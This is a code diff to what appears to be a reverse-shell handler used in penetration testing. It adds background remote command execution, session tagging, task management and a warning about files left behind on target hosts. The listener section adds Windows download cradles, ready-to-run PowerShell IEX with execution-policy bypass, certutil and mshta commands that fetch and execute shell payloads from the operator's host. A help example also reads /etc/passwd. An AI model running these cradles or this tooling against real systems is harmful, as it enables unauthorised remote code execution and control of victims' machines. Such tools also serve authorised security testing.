@@ -139,6 +139,7 @@ COMMAND_MODE_HELP = (
 	"  sessions                 List active sessions\n"
 	"  listeners                List active listeners\n"
 	"  interfaces               Show network interfaces\n"
+	"  tasks                    Show background tasks\n"
 	"  help                     Show this help"
 )
 
@@ -254,6 +255,18 @@ def dispatch_penelope_command(session, cmd_line, respond):
 			respond("\n".join(lines))
 		except Exception as e:
 			respond(f"Error listing interfaces: {e}")
+
+	elif cmd == 'tasks':
+		exec_tasks = session.tasks.get('exec', [])
+		if not exec_tasks:
+			respond("No background tasks")
+			return
+		lines = [f"  {'ID':>3}  {'Status':<10}  {'Started':<19}  Command"]
+		for i, task in enumerate(exec_tasks):
+			info, _control, stop, thread, _output_path = task
+			status = "Done" if stop.is_set() else "Running"
+			lines.append(f"  {i:>3}  {status:<10}  {info['started']:<19}  {info['command']}")
+		respond("\n".join(lines))
 
 	else:
 		respond(f"Unknown command: {cmd}. Type 'help' for available commands.")
@@ -973,8 +986,8 @@ class MainMenu(BetterCMD):
 		super().__init__(*args, **kwargs)
 		self.set_id(None)
 		self.commands = {
-			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script', 'portfwd'],
-			"Session Management":['sessions', 'use', 'interact', 'kill', 'info', 'dir|.'],
+			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'tasks', 'script', 'portfwd'],
+			"Session Management":['sessions', 'use', 'interact', 'kill', 'tag', 'info', 'dir|.'],
 			"Shell Management"  :['listeners', 'payloads', 'connect', 'Interfaces'],
 			"Miscellaneous"     :['help', 'modules', 'history', 'cd', 'reset', 'reload', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
 		}
@@ -1163,7 +1176,7 @@ class MainMenu(BetterCMD):
 						continue
 					print('\n➤  ' + sessions[0].name_colored)
 					table = Table(joinchar=' | ')
-					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source')]
+					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Tag', 'Source')]
 					for session in sessions:
 						if self.sid == session.id:
 							ID = paint('[' + str(session.id) + ']').red
@@ -1181,6 +1194,7 @@ class MainMenu(BetterCMD):
 							ID,
 							paint(session.type).CYAN if session.type == 'PTY' else session.type,
 							session.user or 'N/A',
+							paint(session.tag).magenta if session.tag else '',
 							source
 						]
 					print("\n", indent(str(table), "    "), "\n", sep="")
@@ -1209,6 +1223,7 @@ class MainMenu(BetterCMD):
 			("Arch",       session.arch or 'N/A'),
 			("Shell",      session.type),
 			("User",       session.user or 'N/A'),
+			("Tag",        session.tag or 'N/A'),
 			("Agent",      str(session.agent)),
 			("Source",     str(session.listener or f'Connect({session._host}:{session.port})')),
 			("Remote",     f"{session.target}:{session.port}"),
@@ -1221,6 +1236,46 @@ class MainMenu(BetterCMD):
 		for label, value in fields:
 			table += [paint(label).cyan, paint(value).yellow]
 		print('\n', indent(str(table), '  '), '\n', sep='')
+
+	def do_tag(self, line):
+		"""
+		[SessionID] <label|none>
+		Tag a session with a label for easy identification
+
+		Examples:
+
+			tag webshell		Tag current session as 'webshell'
+			tag 1 webshell		Tag SessionID 1 as 'webshell'
+			tag none		Remove tag from current session
+			tag 1 none		Remove tag from SessionID 1
+		"""
+		if not line:
+			cmdlogger.warning("Usage: tag [SessionID] <label|none>")
+			return
+
+		parts = line.split()
+		session = None
+
+		# If first arg is numeric and matches a session, treat as ID
+		if len(parts) >= 2 and parts[0].isnumeric() and int(parts[0]) in core.sessions:
+			session = core.sessions[int(parts[0])]
+			label = ' '.join(parts[1:])
+		elif self.sid and self.sid in core.sessions:
+			session = core.sessions[self.sid]
+			label = line.strip()
+		elif len(core.sessions) == 1:
+			session = list(core.sessions.values())[0]
+			label = line.strip()
+		else:
+			cmdlogger.warning("No session selected. Use \"use [ID]\" first or specify session ID")
+			return
+
+		if label.lower() == 'none':
+			session.tag = None
+			cmdlogger.info(f"Removed tag from session {paint(session.id).yellow}")
+		else:
+			session.tag = label
+			cmdlogger.info(f"Tagged session {paint(session.id).yellow} as {paint(label).magenta}")
 
 	@session_operation()
 	def do_interact(self, ID):
@@ -1601,63 +1656,152 @@ class MainMenu(BetterCMD):
 	@session_operation(current=True)
 	def do_exec(self, cmdline):
 		"""
-		<remote command>
+		[-b] <remote command>
 		Execute a remote command
 
 		Examples:
 			exec cat /etc/passwd
+			exec -b long_running_scan
 		"""
 		if cmdline:
-			if core.sessions[self.sid].agent:
-				core.sessions[self.sid].exec(
-					cmdline,
-					timeout=None,
-					stdout_dst=sys.stdout.buffer,
-					stderr_dst=sys.stderr.buffer
-				)
+			if cmdline.startswith('-b ') or cmdline == '-b':
+				cmd = cmdline[3:].strip()
+				if not cmd:
+					cmdlogger.warning("No command to execute")
+					return
+				self._exec_background(core.sessions[self.sid], cmd)
 			else:
-				output = core.sessions[self.sid].exec(
-					cmdline,
-					timeout=None,
-					value=True
-				)
-				if output is not None and output is not False:
-					print(output)
+				if core.sessions[self.sid].agent:
+					core.sessions[self.sid].exec(
+						cmdline,
+						timeout=None,
+						stdout_dst=sys.stdout.buffer,
+						stderr_dst=sys.stderr.buffer
+					)
+				else:
+					output = core.sessions[self.sid].exec(
+						cmdline,
+						timeout=None,
+						value=True
+					)
+					if output is not None and output is not False:
+						print(output)
 		else:
 			cmdlogger.warning("No command to execute")
 
-	'''@session_operation(current=True) # TODO
+	def _exec_background(self, session, cmd):
+		"""Run a command in the background with output logged to file."""
+		tasks_dir = session.directory / "tasks"
+		tasks_dir.mkdir(exist_ok=True)
+
+		session._exec_task_counter += 1
+		task_id = session._exec_task_counter
+		started = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+		output_path = tasks_dir / f"task_{task_id}.log"
+
+		control = ControlQueue()
+		stop = threading.Event()
+		info = {'command': cmd, 'started': started, 'task_id': task_id}
+		task = [info, control, stop, None, output_path]
+
+		def run_task():
+			try:
+				with open(output_path, 'wb') as f:
+					if session.agent:
+						session.exec(
+							cmd,
+							timeout=None,
+							stdout_dst=f,
+							stderr_dst=f,
+							agent_control=control
+						)
+					else:
+						output = session.exec(cmd, timeout=None, value=True)
+						if output is not None and output is not False:
+							f.write(output.encode() if isinstance(output, str) else output)
+							f.write(b'\n')
+			except Exception as e:
+				try:
+					with open(output_path, 'ab') as f:
+						f.write(f"\n[penelope] Task error: {e}\n".encode())
+				except Exception:
+					pass
+			finally:
+				stop.set()
+
+		thread = threading.Thread(target=run_task, daemon=True, name=f"bg_exec_{session.id}_{task_id}")
+		task[3] = thread
+		session.tasks['exec'].append(task)
+		thread.start()
+
+		# Open tail in terminal if possible
+		try:
+			Open(f"tail -f {output_path}", terminal=True)
+		except Exception:
+			pass
+
+		cmdlogger.info(f"Background task {paint(task_id).yellow} started: {paint(cmd).cyan}")
+		cmdlogger.info(f"Output: {pathlink(output_path)}")
+
 	def do_tasks(self, line):
 		"""
+		[kill <TaskID>]
+		Show or manage background tasks
 
-		Show assigned tasks
+		Examples:
+
+			tasks			Show all background tasks
+			tasks kill 0		Kill background task 0
 		"""
-		table = Table(joinchar=' | ')
-		table.header = ['SessionID', 'TaskID', 'PID', 'Command', 'Output', 'Status']
+		# Collect all exec tasks across sessions
+		all_tasks = []
+		for sid, session in core.sessions.items():
+			for task in session.tasks.get('exec', []):
+				all_tasks.append((sid, task))
 
-		for sessionid in core.sessions:
-			tasks = core.sessions[sessionid].tasks
-			for taskid in tasks:
-				for stream in tasks[taskid]['streams'].values():
-					if stream.closed:
-						status = paint('Completed!').GREEN
-						break
+		if line:
+			parts = line.split()
+			if parts[0] == 'kill' and len(parts) == 2:
+				try:
+					kill_idx = int(parts[1])
+				except ValueError:
+					cmdlogger.warning("Invalid task ID")
+					return
+				if kill_idx < 0 or kill_idx >= len(all_tasks):
+					cmdlogger.warning(f"Task ID {kill_idx} not found")
+					return
+				sid, task = all_tasks[kill_idx]
+				info, control, stop, thread, output_path = task
+				if stop.is_set():
+					cmdlogger.warning(f"Task {kill_idx} already completed")
 				else:
-					status = paint('Active...').YELLOW
+					control << "stop"
+					stop.set()
+					cmdlogger.info(f"Sent stop signal to task {paint(kill_idx).yellow}")
+			else:
+				cmdlogger.warning("Usage: tasks [kill <TaskID>]")
+			return
 
-				table += [
-					paint(sessionid).red,
-					paint(taskid).cyan,
-					paint(tasks[taskid]['pid']).blue,
-					paint(tasks[taskid]['command']).yellow,
-					paint(tasks[taskid]['streams']['1'].name).green,
-					status
-				]
+		if not all_tasks:
+			print()
+			cmdlogger.warning("No background tasks")
+			print()
+			return
 
-		if len(table) > 1:
-			print(table)
-		else:
-			logger.warning("No assigned tasks")'''
+		table = Table(joinchar=' | ')
+		table.header = [paint(h).cyan for h in ('ID', 'Session', 'Command', 'Started', 'Status', 'Output')]
+		for idx, (sid, task) in enumerate(all_tasks):
+			info, _control, stop, thread, output_path = task
+			status = paint('Done').GREEN if stop.is_set() else paint('Running').YELLOW
+			table += [
+				paint(idx).yellow,
+				paint(sid).red,
+				paint(info['command']).white,
+				info['started'],
+				status,
+				paint(output_path.name).cyan
+			]
+		print('\n', indent(str(table), '  '), '\n', sep='')
 
 	def do_listeners(self, line):
 		"""
@@ -1913,6 +2057,12 @@ class MainMenu(BetterCMD):
 
 	def complete_kill(self, text, line, begidx, endidx):
 		return self.get_core_id_completion(text, "*")
+
+	def complete_tasks(self, text, line, begidx, endidx):
+		return [c for c in ['kill'] if c.startswith(text)]
+
+	def complete_tag(self, text, line, begidx, endidx):
+		return self.get_core_id_completion(text)
 
 	def complete_run(self, text, line, begidx, endidx):
 		return [module.__name__ for module in modules().values() if module.__name__.startswith(text)]
@@ -2418,6 +2568,19 @@ class TCPListener:
 			set DisablePayloadHandler true
 			""").split("\n"))
 
+			output.extend(dedent(f"""
+			{paint('Windows Download Cradles').UNDERLINE}
+
+			{paint('PowerShell IEX (in-memory)').DIM}
+			powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')"
+
+			{paint('Certutil (disk drop)').DIM}
+			certutil -urlcache -split -f http://{ip}:{port}/shell.exe %TEMP%\\shell.exe && %TEMP%\\shell.exe
+
+			{paint('MSHTA (in-memory)').DIM}
+			mshta http://{ip}:{port}/shell.hta
+			""").split("\n"))
+
 		output.append("─" * 80)
 		if not interface_count:
 			return ""
@@ -2650,7 +2813,8 @@ class Session:
 			self.outbuf = io.BytesIO()
 			self.shell_response_buf = io.BytesIO()
 
-			self.tasks = {"portfwd":[], "scripts":[]}
+			self.tasks = {"portfwd":[], "scripts":[], "exec":[]}
+			self._exec_task_counter = 0
 			self.subchannel = Channel()
 			self.latency = None
 
@@ -2676,6 +2840,7 @@ class Session:
 
 			self.upgrade_attempted = False
 			self.uploaded_paths = {}
+			self.tag = None
 
 			core.rlist.append(self)
 
@@ -4889,6 +5054,14 @@ class Session:
 				logger.warning("Port forwarding cleanup timed out, continuing anyway")
 			thread.join(timeout=2)
 
+		for exec_task in self.tasks.get('exec', []):
+			info, control, stop, thread, output_path = exec_task
+			if not stop.is_set():
+				logger.debug(f"Stopping background task: {info['command']}")
+				control << "stop"
+				stop.set()
+			thread.join(timeout=2)
+
 		if self.OS:
 			threading.Thread(target=self.maintain).start()
 		return True
@@ -5723,10 +5896,19 @@ class meterpreter(Module):
 
 
 class cleanup(Module):
+	on_session_end = True
 	def run(session, args):
 		"""
 		Remove uploaded files and directories from the target
 		"""
+		if args is None:
+			# Called from session kill hook — warn about leftover files
+			if session.uploaded_paths:
+				paths = list(session.uploaded_paths.keys())
+				logger.warning(f"Session [{session.id}] left {len(paths)} uploaded file(s) on target:")
+				for p in paths:
+					logger.warning(f"  {p}")
+			return
 		for item in list(session.uploaded_paths.keys()):
 			p = item.strip('"').strip("'")
 			if session.OS == 'Unix':
